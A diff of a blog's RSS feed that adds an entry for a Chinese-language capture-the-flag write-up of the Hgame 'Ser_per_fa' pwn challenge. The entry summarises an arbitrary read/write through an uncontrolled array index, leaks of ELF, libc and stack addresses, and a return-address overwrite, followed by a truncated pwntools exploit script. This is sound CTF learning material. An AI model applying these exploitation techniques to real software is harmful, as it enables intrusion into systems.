@@ -6,7 +6,23 @@
     <description>Recent content in Pwn on BRIdGE</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
-    <lastBuildDate>Wed, 09 Feb 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://kingbridgess.github.io/tags/pwn/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Mon, 14 Feb 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://kingbridgess.github.io/tags/pwn/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Hgame Ser_per_fa复现</title>
+      <link>https://kingbridgess.github.io/posts/hgame-ser_per_fa%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Mon, 14 Feb 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://kingbridgess.github.io/posts/hgame-ser_per_fa%E5%A4%8D%E7%8E%B0/</guid>
+      <description>虽然开源，但spfa还是看得一知半解（下辈子一定学算法
+保护全开，题目有backdoor
+dist下标可控。
+这里可以实现任意读地址
+而这里又可以实现任意写 跟进发现控制add函数的参数，to为偏移，dis为要写的值即可。 官方大致思路就是读出一堆地址，最后把main函数的返回地址写成backdoor的地址。最重要的一点就是确定stack到elf的偏移 因为pie开了，elf,libc,stack三者地址全是随机的。下面确定三者的绝对地址。 libc地址通过got表可以得到。
+elf地址通过elf文件里一个指向elf内部地址的指针可以leak。方法如下： 搜索高2字节为elf地址高2字节(这里是0x5555)的指针 比如这个指针，指向了自己 再算好其到dist的距离即可
+stack的地址: libc有一个三级指针地址_environ,指向栈中的environ,后者指向一个环境变量表。只要找到_environ指向的地址即可确定stack的地址。 然后再计算libcBase和_environ的偏移，和environ到main函数反址的偏移。 exp:
+from pwn import * # o_dist_elfAddr=0x55555555f720-0x55555555b008 # o_libcEnviron_libcBase=0x7fd0fbb332e0-0x7fd0fb944000 # o_stackEnviron_ret=0x7fffffffdf38-0x7fffffffde38 # o_elfAddr_backdoor=0x56204f05d008-0x56204f0576a5 o_dist_elfAddr = 18200 o_libcEnviron_libcBase = 2028256 o_stackEnviron_ret = 256 o_elfAddr_backdoor=22883 p=process(&amp;#39;./spfa&amp;#39;) # p=gdb.debug(&amp;#39;./spfa&amp;#39;) context.log_level=&amp;#39;debug&amp;#39; elf=ELF(&amp;#39;./spfa&amp;#39;) libc=ELF(&amp;#39;libc-2.31.so&amp;#39;) #libcBase p.sendlineafter(&amp;#39;how many datas?\n&amp;gt;&amp;gt; &amp;#39;, b&amp;#39;4&amp;#39;) p.sendlineafter(&amp;#39;how many nodes?\n&amp;gt;&amp;gt; &amp;#39;, b&amp;#39;1&amp;#39;) p.sendlineafter(&amp;#39;how many edges?\n&amp;gt;&amp;gt; &amp;#39;, b&amp;#39;0&amp;#39;) p.sendlineafter(&amp;#39;you want to start from which node?\n&amp;gt;&amp;gt; &amp;#39;, b&amp;#39;0&amp;#39;) o=-(elf.</description>
+    </item>
+    
     <item>
       <title>Hgame Week1 Oldfashion_orw复现</title>
       <link>https://kingbridgess.github.io/posts/hgame-week1-oldfashion_orw%E5%A4%8D%E7%8E%B0/</link>
